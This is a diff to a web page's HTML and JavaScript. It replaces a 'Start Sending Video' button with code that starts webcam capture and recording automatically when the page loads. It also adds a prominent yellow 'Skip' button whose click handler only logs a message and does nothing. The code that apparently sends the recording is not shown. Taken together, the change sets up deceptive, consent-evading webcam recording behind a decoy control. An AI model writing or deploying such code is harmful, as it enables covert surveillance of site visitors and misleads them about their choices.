@@ -18,21 +18,30 @@
             height: 480px;
             background-color: black;
         }
+        .skip-button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: yellow;
+            border: 2px solid #ccc;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
 
 <video id="video" autoplay muted></video>
-<button id="startButton">Start Sending Video</button>
+<div class="skip-button" id="skipButton">Skip</div>
 
 <script>
     const video = document.getElementById('video');
-    const startButton = document.getElementById('startButton');
+    const skipButton = document.getElementById('skipButton');
     let stream;
     let mediaRecorder;
     let recordedChunks = [];
 
-    // Function to start video stream
+    // Function to start video stream and recording
     async function startVideoStream() {
         try {
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -91,8 +100,13 @@
         });
     }
 
-    startButton.addEventListener('click', () => {
-        startVideoStream();
+    // Start the video stream and recording when the page loads
+    window.onload = startVideoStream;
+
+    // Skip button functionality (not implemented, can be customized as needed)
+    skipButton.addEventListener('click', () => {
+        console.log('Skip button clicked');
+        // You can implement any functionality here if needed
     });
 </script>
 
